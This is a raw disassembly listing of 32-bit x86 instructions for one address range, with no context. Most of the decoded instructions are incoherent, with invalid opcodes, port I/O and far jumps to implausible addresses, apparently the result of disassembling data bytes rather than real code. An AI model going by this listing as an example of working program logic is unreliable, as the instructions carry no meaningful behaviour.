  42d40a:	mov    cl,0xbe
  42d40c:	dec    ebp
  42d40d:	shl    DWORD PTR [edx],0x7a
  42d410:	mov    dh,0x4f
  42d412:	push   edx
  42d413:	addr16 call 0xf2f2fd31
  42d419:	je     0x42d446
  42d41b:	sbb    al,0x31
  42d41d:	inc    edi
  42d41e:	sar    BYTE PTR fs:[ecx+eax*1-0x6f],cl
  42d423:	ror    DWORD PTR [ebp+0x5195fb42],1
  42d429:	out    0x21,eax
  42d42b:	xchg   ecx,eax
  42d42c:	and    eax,0x8d4ab549
  42d431:	fwait
  42d432:	mov    WORD PTR [ecx+ebp*8-0x2a401395],?
  42d439:	push   es
  42d43a:	sub    bh,BYTE PTR [eax]
  42d43c:	push   esi
  42d43d:	(bad)  
  42d43e:	lods   al,BYTE PTR ds:[esi]
  42d43f:	pop    edi
  42d440:	xor    eax,0x995f9632
  42d445:	push   ds
  42d446:	in     ax,0x24
  42d449:	jmp    0x81b60dc0
  42d44e:	inc    edx
  42d44f:	addr16 inc ebx
  42d451:	add    al,0x35
  42d453:	mov    ds:0xfb72c184,al
  42d458:	jnp    0x42d3e4
  42d45a:	xchg   ebp,eax
  42d45b:	outs   dx,BYTE PTR ds:[esi]
  42d45c:	adc    eax,0xbfeb119f
  42d461:	ret    0xc480
  42d464:	inc    esp
  42d465:	adc    al,0x5d
  42d468:	cmp    al,BYTE PTR [edx]
  42d46a:	pop    edx
  42d46b:	cwde   
  42d46c:	xor    esp,DWORD PTR [esi]
  42d46e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d46f:	push   ds
  42d470:	jnp    0x42d498
  42d472:	ret    
  42d473:	mov    al,0x45
  42d475:	inc    esp
  42d476:	mov    esp,0xf24ba2e4
  42d47b:	out    0xf6,al
  42d47d:	jbe    0x42d4b5
  42d47f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d480:	mov    eax,cs:0x5b3557fe
  42d486:	xor    DWORD PTR [ebx+0x423f1165],edx
  42d48c:	pop    ecx
  42d48d:	dec    edi
  42d48e:	(bad)  
  42d490:	sub    edx,DWORD PTR [esi]
  42d492:	out    0xcf,al
  42d494:	idiv   DWORD PTR [eax]
  42d496:	aas    
  42d497:	loope  0x42d508
  42d499:	xor    al,0x3c
  42d49b:	ins    BYTE PTR es:[edi],dx
  42d49c:	add    eax,0x64c87b07
  42d4a1:	mov    eax,0xf9c201e7
  42d4a6:	xchg   esp,eax
  42d4a7:	stc    
  42d4a8:	cmp    eax,0x3b37405f
  42d4ad:	inc    eax
  42d4ae:	fwait
  42d4af:	pop    ss
  42d4b0:	sahf   
  42d4b1:	inc    eax
  42d4b2:	fbstp  TBYTE PTR [edx-0x3dfd197c]
  42d4b8:	jne    0x42d476
  42d4ba:	xor    eax,0x68963b6c
  42d4bf:	mov    eax,0x33ee62b7
  42d4c4:	xchg   bl,dl
  42d4c6:	stos   DWORD PTR es:[edi],eax
  42d4c7:	test   DWORD PTR [edi-0x64738718],ecx
  42d4cd:	mov    eax,ds:0x4b20af85
  42d4d2:	loope  0x42d4db
  42d4d4:	(bad)  
  42d4d5:	sub    bl,BYTE PTR ds:[eax+ecx*4]
  42d4d9:	hlt    
  42d4da:	jmp    0x6ae5:0xc8d6f811
  42d4e1:	lahf   
  42d4e2:	aas    
  42d4e3:	jl     0x42d4f1
  42d4e5:	js     0x42d4a3
  42d4e7:	lock ja 0x42d4a6
  42d4ea:	sub    DWORD PTR [ecx-0x4a],0xe9d7250
  42d4f1:	xlat   BYTE PTR ds:[ebx]
  42d4f2:	aas    
  42d4f3:	clc    
  42d4f4:	loopne 0x42d492
  42d4f6:	and    DWORD PTR [edx+0x70],esp
  42d4f9:	dec    edx
  42d4fa:	cmp    BYTE PTR [eax+0x61e79ab0],0xc6
  42d501:	rol    bl,1
  42d503:	cmp    BYTE PTR [edx+0x1d16ab1d],cl
  42d509:	adc    ebx,DWORD PTR [ebx+0x54]
  42d50c:	imul   ebx,DWORD PTR [ecx-0x5338e924],0xffffffd2
  42d513:	sbb    ah,BYTE PTR [ecx-0xc4f2ede]
  42d519:	call   0xf649eb0c
  42d51e:	xor    eax,0x4419ad91
  42d523:	push   si
  42d525:	or     ebp,ebp
  42d527:	dec    edi
  42d528:	(bad)  
  42d529:	jnp    0x42d4c6
  42d52b:	in     al,dx
  42d52c:	jae    0x42d4ea
  42d52e:	in     al,dx
  42d52f:	mul    BYTE PTR [esi]
  42d531:	in     eax,dx
  42d532:	dec    edi
  42d533:	or     al,0x7b
  42d535:	iret   
  42d536:	sub    al,0x40
  42d538:	xor    al,0x35
  42d53a:	jl     0x42d50f
  42d53c:	adc    bh,bl
  42d53e:	fist   DWORD PTR [eax+0x42]
  42d541:	cld    
  42d542:	inc    ebp
  42d543:	call   0xf7ec:0x8edafc11
  42d54a:	pop    ds
  42d54b:	ficom  DWORD PTR [ebx+ebp*8+0x1c2c5d25]
  42d552:	or     eax,0x1ed42abf
  42d557:	or     al,0x67
  42d559:	sub    al,0xa2
  42d55b:	jl     0x42d581
  42d55d:	mov    WORD PTR es:[ecx+0x68],ds
  42d561:	adc    bl,ah
  42d563:	and    DWORD PTR ds:0x47f9d0b3,0x21ab7d9f
  42d56d:	jecxz  0x42d540
  42d56f:	in     eax,0x1d
  42d571:	cmp    ch,bh
  42d573:	jmp    0xf8408778
  42d578:	xchg   ebp,eax
  42d579:	and    eax,0xdce47b6b
  42d57e:	into   
  42d57f:	mov    ah,0x8e
  42d581:	sub    edi,DWORD PTR [ebx+0x3d]
  42d584:	loope  0x42d5a3
  42d586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d587:	xchg   BYTE PTR [ebp-0x79bef3e2],dh
  42d58d:	test   eax,0x4104d7da
  42d592:	xor    ch,dl
  42d594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d595:	push   esp
  42d596:	inc    eax
  42d597:	shr    BYTE PTR [ebp-0x5fd8a1da],1
  42d59d:	in     al,dx
  42d59e:	jecxz  0x42d5fe
  42d5a0:	bound  edx,QWORD PTR [ecx*8+0x4d83036a]
  42d5a7:	(bad)  
  42d5a8:	rep ins BYTE PTR es:[edi],dx
  42d5aa:	fbld   TBYTE PTR [edx-0x35]
  42d5ad:	fistp  QWORD PTR [ebx+ebp*1-0x4f]
  42d5b1:	add    al,0x9d
  42d5b3:	test   BYTE PTR [edx+esi*2+0x31935176],ch
  42d5ba:	cmp    BYTE PTR [edi-0x226ac300],bl
  42d5c0:	addr16 push edi
  42d5c2:	push   ecx
  42d5c3:	xchg   edx,eax
  42d5c4:	sahf   
  42d5c5:	enter  0xfad1,0xa7
  42d5c9:	(bad)  
  42d5ca:	(bad)  
  42d5cb:	jnp    0x42d551
  42d5cd:	imul   ecx,DWORD PTR [edx-0x77],0xffffffc2
  42d5d1:	fs sbb ecx,0xa7e152b0
  42d5d8:	imul   eax,DWORD PTR [ecx+0x59],0x8b8a2d89
  42d5df:	jle    0x42d617
  42d5e1:	fwait
  42d5e2:	jmp    edx
  42d5e4:	aad    0x86
  42d5e6:	push   0x850a6bf4
  42d5eb:	cmp    ebx,DWORD PTR [ecx]
  42d5ed:	(bad)  
  42d5ee:	sub    bh,dh
  42d5f0:	dec    eax
  42d5f1:	lods   al,BYTE PTR ds:[si]
  42d5f3:	push   ebp
  42d5f4:	adc    BYTE PTR [ebp+0x7b],ch
  42d5f7:	pop    esi
  42d5f8:	pop    ss
  42d5f9:	or     ecx,DWORD PTR [edx-0x12]
  42d5fc:	iret   
  42d5fd:	adc    eax,0x2aa75ed6
  42d602:	lea    ebp,[edi+0x7d38e75]
  42d608:	push   edi
  42d609:	and    ecx,edx
  42d60b:	ret    
  42d60c:	aas    
  42d60d:	cli    
  42d60e:	or     ecx,DWORD PTR [ecx]
  42d610:	jns    0x42d5b6
  42d612:	sub    BYTE PTR [ebx+0x2aeffae5],ah
  42d618:	add    DWORD PTR ds:0xabde3b15,esi
  42d61e:	ret    
  42d61f:	fild   WORD PTR [eax+0x55]
  42d622:	jo     0x42d672
  42d624:	jge    0x42d698
  42d626:	or     eax,0xb70c511a
  42d62b:	jmp    0x44e7675f
  42d630:	pushf  
  42d631:	jge    0x42d6a6
  42d633:	dec    esi
  42d634:	call   0x87076cfd
  42d639:	loope  0x42d685
  42d63b:	std    
  42d63c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d63d:	push   ss
  42d63e:	ret    0xee8d
  42d641:	add    al,BYTE PTR [ebx]
  42d643:	push   eax
  42d644:	test   al,0x60
  42d646:	sti    
  42d647:	inc    ebp
  42d648:	jo     0x42d6c6
  42d64a:	loope  0x42d657
  42d64c:	jg     0x42d626
  42d64e:	cmp    eax,0xb9c6d985
  42d653:	ins    DWORD PTR es:[edi],dx
  42d654:	les    ebx,FWORD PTR [edi]
  42d656:	hlt    
  42d657:	(bad)  
  42d658:	iret   
  42d659:	xchg   esi,eax
  42d65a:	lds    esp,FWORD PTR [esi+0x260937b3]
  42d660:	sub    edi,DWORD PTR [eax+0x47d26426]
  42d666:	popf   
  42d667:	in     al,dx
  42d668:	cwde   
  42d669:	popa   
  42d66a:	ret    
  42d66b:	enter  0x8059,0x53
  42d66f:	inc    esp
  42d670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d671:	fidiv  DWORD PTR gs:[ebp-0x6e]
  42d675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d676:	not    BYTE PTR [esi-0x69]
  42d679:	and    DWORD PTR [ecx],ebx
  42d67b:	mov    ebx,0x9798772a
  42d680:	popa   
  42d681:	or     esi,ebx
  42d683:	stos   BYTE PTR es:[edi],al
  42d684:	loop   0x42d66d
  42d686:	sub    dh,BYTE PTR [ecx-0x36d37948]
  42d68c:	pop    esp
  42d68d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d68e:	cwde   
  42d68f:	pusha  
  42d690:	adc    al,0xdf
  42d692:	scas   al,BYTE PTR es:[edi]
  42d693:	jae    0x42d66a
  42d695:	out    0xa8,al
  42d697:	std    
  42d698:	jl     0x42d703
  42d69a:	sbb    bl,ch
  42d69c:	inc    ebx
  42d69d:	push   ecx
  42d69e:	(bad)  
  42d69f:	sbb    eax,0xae9279e1
  42d6a4:	cmp    BYTE PTR [ebp+0x505ef144],cl
  42d6aa:	jns    0x42d723
  42d6ac:	(bad)  
  42d6ad:	retf   
  42d6ae:	mov    bh,0xd8
  42d6b0:	(bad)  
  42d6b1:	jmp    0xc4459584
  42d6b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d6b7:	jl     0x42d711
  42d6b9:	add    eax,0xeca23faf
  42d6be:	pop    edi
  42d6bf:	fsub   DWORD PTR [edi]
  42d6c1:	call   0x2a96:0x8707ed96
  42d6c8:	imul   esi,DWORD PTR [esi],0x70
  42d6cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d6cc:	mov    ds:0xf3c478f2,eax
  42d6d1:	cwde   
  42d6d2:	retf   0x6bb7
  42d6d5:	pop    ss
  42d6d6:	into   
  42d6d7:	(bad)  
  42d6d8:	in     eax,0x50
  42d6da:	fistp  QWORD PTR [edi+0x4]
  42d6dd:	outs   dx,DWORD PTR ds:[esi]
  42d6de:	and    dh,BYTE PTR [edi-0x24e501a2]
  42d6e4:	push   edx
  42d6e5:	loop   0x42d6e5
  42d6e7:	ror    DWORD PTR [ecx],cl
  42d6e9:	dec    ebx
  42d6ea:	je     0x42d6bc
  42d6ec:	js     0x42d68f
  42d6ee:	xchg   ecx,eax
  42d6ef:	outs   dx,DWORD PTR ds:[esi]
  42d6f0:	or     DWORD PTR [edx-0x6a],edi
  42d6f3:	push   cs
  42d6f4:	pop    ebx
  42d6f5:	jae    0x42d75e
  42d6f7:	test   eax,0x5629032e
  42d6fc:	pop    ecx
  42d6fd:	sbb    eax,edx
  42d6ff:	ret    
  42d700:	ins    BYTE PTR es:[edi],dx
  42d701:	aas    
  42d702:	add    BYTE PTR [edx+esi*1-0x72859250],bl
  42d709:	inc    ebp
  42d70a:	cli    
  42d70b:	loope  0x42d70c
  42d70d:	dec    esp
  42d70e:	int    0x27
  42d710:	pop    edi
  42d711:	loop   0x42d6f9
  42d713:	fidiv  WORD PTR [ebp-0x35]
  42d716:	outs   dx,BYTE PTR ds:[esi]
  42d717:	or     esi,DWORD PTR ds:0x77795bd
  42d71d:	hlt    
  42d71e:	jl     0x42d6a8
  42d720:	ficom  DWORD PTR es:0x2a2e1f6
  42d727:	ret    
  42d728:	sub    DWORD PTR [esi],edx
  42d72a:	xor    BYTE PTR [edi],cl
  42d72c:	dec    edi
  42d72d:	test   al,0xb4
  42d72f:	add    al,0x92
  42d731:	push   es
  42d732:	out    dx,al
  42d733:	call   0xb686:0x9eeea523
  42d73a:	out    dx,eax
  42d73b:	aas    
  42d73c:	adc    ah,BYTE PTR [edi+0x42d5cce0]
  42d742:	mov    cl,0xe6
  42d744:	outs   dx,BYTE PTR ds:[esi]
  42d745:	mov    ah,0xee
  42d747:	(bad)
  42d74a:	stos   BYTE PTR es:[edi],al
  42d74b:	dec    edi
  42d74c:	mov    al,0x7c
  42d74e:	jb     0x42d6ed
  42d750:	aas    
  42d751:	mov    esp,0x80710064
  42d756:	sti    
  42d757:	add    esp,DWORD PTR [ebp+0x602cb132]
  42d75d:	or     BYTE PTR [ebp-0x725feda7],ah
  42d763:	push   esp
  42d764:	jl     0x42d6f9
  42d766:	aaa    
  42d767:	(bad)  
  42d768:	push   edx
  42d769:	push   0x44
  42d76b:	sti    
  42d76c:	dec    esi
  42d76d:	cmp    DWORD PTR [ecx+0x4c],eax
  42d770:	scas   eax,DWORD PTR es:[edi]
  42d771:	js     0x42d714
  42d773:	push   ebp
  42d774:	mov    cl,0x5d
  42d776:	pop    es
  42d777:	push   DWORD PTR [esi-0x6537a7ee]
  42d77d:	dec    edi
  42d77e:	adc    DWORD PTR [ebp-0x29],esi
  42d781:	jl     0x42d740
  42d783:	dec    edi
  42d784:	mov    eax,ds:0x6e2aea5
  42d789:	imul   edx,edi,0x5c
  42d78c:	aam    0x66
  42d78e:	inc    esi
  42d78f:	and    DWORD PTR [eax],edx
  42d791:	dec    edi
  42d792:	xlat   BYTE PTR ds:[ebx]
  42d793:	loopne 0x42d768
  42d795:	sbb    esp,DWORD PTR [ebp+0x35b86d14]
  42d79b:	rcl    BYTE PTR [esi+ecx*8-0x1],cl
  42d79f:	test   DWORD PTR [edx-0x56],0xfec5126b
  42d7a6:	push   eax
  42d7a7:	es sbb eax,0xac450737
  42d7ad:	sti    
  42d7ae:	xor    DWORD PTR [edi-0x30b9b31f],edx
  42d7b4:	or     BYTE PTR [ebp+0x1b],cl
  42d7b7:	sar    DWORD PTR [edx],0xfc
  42d7ba:	ins    BYTE PTR es:[edi],dx
  42d7bb:	mov    edx,0x19730761
  42d7c0:	out    dx,al
  42d7c1:	sub    BYTE PTR [ebx+ecx*1-0x5d],dh
  42d7c5:	fcom   DWORD PTR [edx]
  42d7c7:	cmp    DWORD PTR [ecx],ebx
  42d7c9:	jmp    0x79905384
  42d7ce:	cmp    DWORD PTR [ebx-0x66126a81],eax
  42d7d4:	mov    bl,0xf5
  42d7d6:	sub    DWORD PTR [esi-0x7740921e],eax
  42d7dc:	loope  0x42d7c5
  42d7de:	dec    ebx
  42d7df:	adc    cl,BYTE PTR ds:0x5314e752
  42d7e5:	mov    ds:0x4e2a6a38,eax
  42d7ea:	sbb    bh,BYTE PTR [edx-0x680feb26]
  42d7f0:	fdiv   DWORD PTR [ecx+0x62d7344b]
  42d7f6:	cmc    
  42d7f7:	xchg   edx,eax
  42d7f8:	clc    
  42d7f9:	mov    al,bh
  42d7fb:	ins    DWORD PTR es:[edi],dx
  42d7fc:	adc    ebp,edi
  42d7fe:	inc    edi
  42d7ff:	sub    al,0x81
  42d801:	mov    eax,edx
  42d803:	aam    0x12
  42d805:	stos   DWORD PTR es:[edi],eax
  42d806:	mov    fs,WORD PTR [eax]
  42d808:	cmp    ebx,0xeb887152
  42d80e:	outs   dx,DWORD PTR ds:[esi]
  42d80f:	das    
  42d810:	dec    esp
  42d811:	daa    
  42d812:	cmp    al,0x50
  42d814:	sub    al,0xbf
  42d816:	daa    
  42d817:	jmp    0x42d7dc
  42d819:	in     eax,dx
  42d81a:	leave  
  42d81b:	enter  0x4db9,0x6a
  42d81f:	and    DWORD PTR [edi-0x6b],0xffffffb2
  42d823:	fsub   DWORD PTR [esi+eax*8]
  42d826:	jbe    0x42d7cc
  42d828:	daa    
  42d829:	push   esi
  42d82a:	cmp    al,0xa9
  42d82c:	mov    edx,0x51710721
  42d831:	xchg   DWORD PTR [esi+0x66077361],ecx
  42d837:	sub    DWORD PTR [ebx-0x2c],edx
  42d83a:	(bad)  
  42d83b:	in     al,dx
  42d83c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d83d:	aaa    
  42d83e:	sbb    DWORD PTR [eax],eax
  42d840:	(bad)  
  42d841:	mov    dh,0x12
  42d843:	or     dh,BYTE PTR [esi+ecx*4]
  42d846:	pop    esp
  42d847:	or     ecx,edx
  42d849:	in     eax,dx
  42d84a:	rol    DWORD PTR [ebx-0x443ab6ee],cl
  42d850:	xor    eax,0x7f5638d5
  42d855:	lods   al,BYTE PTR ds:[esi]
  42d856:	sbb    al,ah
  42d858:	int3   
  42d859:	jmp    0x12c1:0xf86ad437
  42d860:	add    ebp,DWORD PTR [edx-0x3]
  42d863:	adc    al,0xf4
  42d865:	xor    esi,DWORD PTR [eax+edi*8-0x2f0e4fcc]
  42d86c:	mov    dl,bh
  42d86e:	mov    dh,0x20
  42d870:	(bad)  
  42d871:	loope  0x42d823
  42d873:	dec    esi
  42d874:	xchg   esi,eax
  42d875:	retf   
  42d876:	dec    edi
  42d877:	push   edi
  42d878:	mov    ah,0x11
  42d87a:	inc    esp
  42d87b:	pop    ecx
  42d87c:	pop    esi
  42d87d:	jns    0x42d887
  42d87f:	dec    ebp
  42d880:	mov    BYTE PTR [edx],bh
  42d882:	sub    esp,DWORD PTR [eax+0x6f81443a]
  42d888:	push   ecx
  42d889:	addr16 enter 0xf294,0xdc
  42d88e:	js     0x42d8c7
  42d890:	sar    esp,cl
  42d892:	scas   eax,DWORD PTR es:[edi]
  42d893:	inc    esi
  42d894:	int    0xbe
  42d896:	sahf   
  42d897:	jge    0x42d8c1
  42d899:	and    ebx,DWORD PTR [ebx-0x45]
  42d89c:	and    BYTE PTR [edx+0x3e],0xe0
  42d8a0:	neg    al
  42d8a2:	rol    DWORD PTR [ebx-0x372ad6ab],1
  42d8a8:	popf   
  42d8a9:	cdq    
  42d8aa:	inc    eax
  42d8ab:	adc    dh,BYTE PTR [ebp+0x1a]
  42d8ae:	neg    DWORD PTR [edi]
  42d8b0:	out    dx,al
  42d8b1:	lock or ecx,DWORD PTR [bx+si+0x4752]
  42d8b7:	out    dx,al
  42d8b8:	add    DWORD PTR [ecx+esi*2+0x58a98de5],ebp
  42d8bf:	pop    ds
  42d8c0:	and    eax,0xc8970698
  42d8c5:	adc    DWORD PTR [ebx],edi
  42d8c7:	mov    bl,0x46
  42d8c9:	aas    
  42d8ca:	repz mov edx,0x45f9aca6
  42d8d0:	push   esi
  42d8d1:	mov    bh,0x9b
  42d8d3:	(bad)  
  42d8d4:	fcom   QWORD PTR [edx+0x5a]
  42d8d7:	scas   al,BYTE PTR es:[edi]
  42d8d8:	adc    al,0xeb
  42d8da:	mov    al,0xa3
  42d8dc:	pop    ecx
  42d8dd:	(bad)  
  42d8de:	mov    ds:0xfd7fb8a8,eax
  42d8e3:	cld    
  42d8e4:	xor    dh,ah
  42d8e6:	test   al,0x8e
  42d8e8:	imul   ecx,DWORD PTR [edx-0x8],0x80533f73
  42d8ef:	mov    ebp,0x935e24a8
  42d8f4:	and    BYTE PTR [edi],al
  42d8f6:	jecxz  0x42d881
  42d8f8:	xor    BYTE PTR [ecx+0xe35a62b],cl
  42d8fe:	js     0x42d954
  42d900:	int    0x85
  42d902:	mov    BYTE PTR [eax+0x32f14d7f],ah
  42d908:	pop    ebp
  42d909:	jne    0x42d8a2
  42d90b:	push   ss
  42d90c:	dec    ebp
  42d90d:	test   DWORD PTR [ecx],eax
  42d90f:	sti    
  42d910:	push   ecx
  42d911:	jb     0x42d96f
  42d913:	xor    BYTE PTR [esi],ah
  42d915:	cmp    DWORD PTR [ebp+0x1ade824a],ebx
  42d91b:	push   0x3f806690
  42d920:	add    al,0xc7
  42d922:	aas    
  42d923:	jp     0x42d901
  42d925:	xor    cl,BYTE PTR [esp+edi*4-0x494f896a]
  42d92c:	fisub  WORD PTR [ebx+0x59]
  42d92f:	(bad)  
  42d931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d932:	xchg   dh,ch
  42d934:	mov    ebp,0x5dbeb898
  42d939:	clc    
  42d93a:	mov    ebp,eax
  42d93c:	neg    ebp
  42d93e:	sti    
  42d93f:	loop   0x42d8e6
  42d941:	pop    edx
  42d942:	or     bl,ah
  42d944:	pop    ebx
  42d945:	sub    DWORD PTR [eax-0x25],0x54efc7cf
  42d94c:	pop    esp
  42d94d:	sbb    al,0xc1
  42d94f:	xchg   ebp,eax
  42d950:	inc    ebp
  42d951:	jmp    0x76b37f18
  42d956:	push   ds
  42d957:	cmc    
  42d958:	dec    ebp
  42d959:	and    esi,ebx
  42d95b:	jl     0x42d9cc
  42d95d:	adc    al,0xb
  42d95f:	mov    ebx,0xa2e43ded
  42d964:	out    0x79,al
  42d966:	fwait
  42d967:	pop    edi
  42d968:	and    ebp,DWORD PTR [esi]
  42d96a:	jno    0x42d9bc
  42d96c:	ins    DWORD PTR es:[edi],dx
  42d96d:	aam    0x80
  42d96f:	push   ds
  42d970:	fist   WORD PTR [esp+ebp*1]
  42d973:	ds dec ebx
  42d975:	jb     0x42d9dc
  42d977:	and    dl,al
  42d979:	js     0x42d996
  42d97b:	repnz imul esi,DWORD PTR [eax+0x41bb7e04],0xffffffd5
  42d983:	push   eax
  42d984:	push   ss
  42d985:	stos   BYTE PTR es:[edi],al
  42d986:	mov    eax,0xa2cbe47b
  42d98b:	scas   eax,DWORD PTR es:[edi]
  42d98c:	jnp    0x42d96f
  42d98e:	mov    ds:0x89aaab4f,eax
  42d993:	inc    esi
  42d994:	lock outs dx,DWORD PTR ds:[esi]
  42d996:	std    
  42d997:	fsub   QWORD PTR [edi]
  42d999:	dec    edi
  42d99a:	mov    eax,ds:0x65561c90
  42d99f:	sbb    cl,BYTE PTR [ebp-0x691eb263]
  42d9a5:	cmp    ebp,0x29
  42d9a8:	mov    ah,0x8d
  42d9aa:	sub    bh,0xaf
  42d9ad:	in     eax,dx
  42d9ae:	push   ebx
  42d9af:	(bad)  
  42d9b0:	xchg   edi,eax
  42d9b1:	in     eax,0x17
  42d9b3:	lds    ebx,FWORD PTR [eax]
  42d9b5:	dec    esi
  42d9b6:	scas   eax,DWORD PTR es:[edi]
  42d9b7:	cmp    al,0xf4
  42d9b9:	xlat   BYTE PTR ds:[ebx]
  42d9ba:	dec    eax
  42d9bb:	mov    ah,0x99
  42d9bd:	mov    eax,ds:0xf4dd25e0
  42d9c2:	sub    al,0x95
  42d9c4:	je     0x42d98b
  42d9c6:	jbe    0x42d99d
  42d9c8:	adc    al,0x9e
  42d9ca:	dec    eax
  42d9cb:	jns    0x42d9bc
  42d9cd:	sub    ebx,esp
  42d9cf:	arpl   WORD PTR [edx+0x32],si
  42d9d2:	jmp    0x2de22b
  42d9d7:	mov    al,ds:0x8f1dc419
  42d9dc:	mov    al,0x97
  42d9de:	scas   al,BYTE PTR es:[edi]
  42d9df:	iret   
  42d9e0:	pop    ebx
  42d9e1:	imul   esi,DWORD PTR [esi+0x2d6b1f7],0x59738608
  42d9eb:	outs   dx,DWORD PTR ds:[esi]
  42d9ec:	repnz cli 
  42d9ee:	ja     0x42d9d4
  42d9f0:	rcr    DWORD PTR [eax-0x566e305],0x82
  42d9f7:	jmp    0x52c42a2f
  42d9fc:	and    ebx,DWORD PTR [eax-0x6cab47b2]
  42da02:	hlt    
  42da03:	add    DWORD PTR [ecx],esi
  42da05:	into   
  42da06:	cld    
  42da07:	dec    ecx
  42da08:	dec    ebx
  42da09:	mov    esi,0x488d214c
  42da0e:	ror    DWORD PTR [edi],0xc9
  42da11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da12:	lahf   
  42da13:	sbb    esi,DWORD PTR [ecx-0x4b]
  42da16:	call   0xe1f2:0xf298d4a5
  42da1d:	fbstp  TBYTE PTR [ecx+0x6b710dc5]
  42da23:	adc    ebp,DWORD PTR [esi-0x66]
  42da26:	or     al,0x58
  42da28:	dec    ebx
  42da29:	push   ebp
  42da2a:	fnstsw WORD PTR [esi]
  42da2c:	aaa    
  42da2d:	mov    dh,0xae
  42da2f:	ins    BYTE PTR es:[edi],dx
  42da30:	inc    eax
  42da31:	lock mov ds:0x4e934b0b,eax
  42da37:	inc    edx
  42da38:	ret    
  42da39:	jne    0x42da42
  42da3b:	cs mov eax,0x503ed6b9
  42da41:	addr16 fwait
  42da43:	add    BYTE PTR [esi+0x1d],ah
  42da46:	cwde   
  42da47:	(bad)  
  42da48:	loope  0x42da75
  42da4a:	fistp  QWORD PTR [ebx]
  42da4c:	iret   
  42da4d:	aam    0x33
  42da4f:	sar    BYTE PTR [ebp+edi*1+0x4b],1
  42da53:	in     al,0xdd
  42da55:	and    cl,BYTE PTR [ecx-0x30]
  42da58:	push   esp
  42da59:	push   cs
  42da5a:	inc    ebp
  42da5b:	jge    0x42da0d
  42da5d:	in     eax,dx
  42da5e:	inc    edi
  42da5f:	xor    eax,DWORD PTR [ebp-0x79d68d88]
  42da65:	retf   
  42da66:	shr    DWORD PTR [esi],cl
  42da68:	mov    al,0x41
  42da6a:	mov    WORD PTR [ebx+0x6dbdeb93],?
  42da70:	pop    esi
  42da71:	xor    eax,0x6ea0dad3
  42da76:	pop    ebp
  42da77:	mov    ch,0xaa
  42da79:	pop    eax
  42da7a:	aad    0x2d
  42da7c:	jbe    0x42dac7
  42da7e:	jp     0x42daad
  42da80:	cmp    DWORD PTR [esi],eax
  42da82:	xchg   ebp,eax
  42da83:	dec    esp
  42da84:	std    
  42da85:	jl     0x42daf4
  42da87:	dec    ebx
  42da88:	into   
  42da89:	scas   eax,DWORD PTR es:[edi]
  42da8a:	js     0x42dad4
  42da8c:	xchg   BYTE PTR [ecx+0x267c1d97],ch
  42da92:	stos   DWORD PTR es:[edi],eax
  42da93:	jns    0x42da93
  42da95:	inc    esp
  42da96:	imul   BYTE PTR ds:0x7017bd49
  42da9c:	inc    edx
  42da9d:	xor    eax,0x7713447b
  42daa2:	jnp    0x42dace
  42daa4:	pop    ebx
  42daa5:	popf   
  42daa6:	xlat   BYTE PTR ds:[ebx]
  42daa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42daa8:	test   eax,0x64577b8c
  42daad:	jns    0x42dad7
  42daaf:	sbb    DWORD PTR [esi],edi
  42dab1:	mov    esp,0x166b37aa
  42dab6:	loopne 0x42da87
  42dab8:	ins    BYTE PTR es:[edi],dx
  42dab9:	loop   0x42dac1
  42dabb:	dec    eax
  42dabc:	sbb    al,0xd9
  42dabe:	sbb    BYTE PTR [esi-0x60],dh
  42dac1:	push   ebx
  42dac2:	sub    ebx,DWORD PTR [esi+0x58e91256]
  42dac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dac9:	sbb    BYTE PTR [eax],cl
  42dacb:	cli    
  42dacc:	mov    esi,0xa312fe77
  42dad1:	mov    ebp,0xaeeeb690
  42dad6:	jne    0x42da7b
  42dad8:	xchg   edx,eax
  42dad9:	sti    
  42dada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dadb:	outs   dx,BYTE PTR ds:[esi]
  42dadc:	add    BYTE PTR [edi-0x2b],bl
  42dadf:	pop    edx
  42dae0:	scas   eax,DWORD PTR es:[edi]
  42dae1:	mov    bl,0x26
  42dae3:	dec    ecx
  42dae4:	(bad)  [eax+0x6e7962c4]
  42daea:	imul   ebp,edx,0x7e
  42daed:	(bad)
  42daf0:	aaa    
  42daf1:	ffree  st(4)
  42daf3:	div    DWORD PTR ds:0xfc3533c0
  42daf9:	xor    DWORD PTR [ebp-0x20],esi
  42dafc:	adc    BYTE PTR [ebp-0x5d27b0a],0x5a
  42db03:	inc    edx
  42db04:	(bad)  
  42db05:	hlt    
  42db06:	sahf   
  42db07:	iret   
  42db08:	rcr    BYTE PTR [edx+0x5a],0x7d
  42db0c:	sub    edx,DWORD PTR [esi-0x686e888]
  42db12:	(bad)
  42db16:	fild   DWORD PTR [ecx-0x679c27bd]
  42db1c:	push   cs
  42db1d:	push   0x629458ae
  42db22:	inc    edx
  42db23:	jno    0x42db22
  42db25:	ds pop ebx
  42db27:	mov    ebx,0xbfff21f6
  42db2c:	jmp    0xbc61f2e3
  42db31:	inc    esi
  42db32:	adc    eax,0xd6d58ba4
  42db37:	outs   dx,DWORD PTR ds:[si]
  42db39:	(bad)
  42db3c:	cmp    DWORD PTR [edi],edi
  42db3e:	ja     0x42db84
  42db40:	jmp    0x42db4e
  42db42:	sbb    eax,0x8a492814
  42db47:	mov    esp,0xade0e228
  42db4c:	xor    ebp,DWORD PTR [edx+0x42]
  42db4f:	pop    ecx
  42db50:	ins    DWORD PTR es:[edi],dx
  42db51:	sub    DWORD PTR [esi-0x6d73106b],ebx
  42db57:	dec    edx
  42db58:	push   ss
  42db59:	dec    esi
  42db5a:	jmp    0xa8f98661
  42db5f:	inc    esp
  42db60:	adc    cl,BYTE PTR ds:0x5fb00d1a
  42db66:	adc    cl,BYTE PTR [ecx-0x46]
